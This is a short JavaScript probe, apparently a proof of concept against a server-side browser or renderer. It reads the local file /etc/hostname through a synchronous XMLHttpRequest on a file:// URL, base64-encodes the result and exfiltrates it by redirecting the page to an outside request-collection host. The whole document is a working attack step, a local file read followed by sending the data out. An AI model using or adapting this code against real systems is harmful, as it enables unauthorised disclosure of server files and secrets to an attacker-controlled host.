(function() {
    'use strict';
    
    const SERVER = 'https://aab.requestcatcher.com';
    
    // =================================================================
    // TEST 1: Can we read files at all?
    // =================================================================
    
    let testResult = 'UNKNOWN';
    
    try {
        const xhr = new XMLHttpRequest();
        xhr.open('GET', 'file:///etc/hostname', false); // Synchronous
        xhr.send();
        
        if (xhr.status === 200 || xhr.status === 0) {
            if (xhr.responseText && xhr.responseText.length > 0) {
                testResult = 'SUCCESS: ' + xhr.responseText;
            } else {
                testResult = 'EMPTY: Status=' + xhr.status;
            }
        } else {
            testResult = 'FAILED: Status=' + xhr.status;
        }
    } catch(e) {
        testResult = 'ERROR: ' + e.message;
    }
    
    // =================================================================
    // SEND RESULT VIA REDIRECT (only way that works when browser closes)
    // =================================================================
    
    // This navigation happens BEFORE browser closes
    window.location = SERVER + '/file-test?result=' + encodeURIComponent(btoa(testResult)) + '&time=' + Date.now();
    
})();
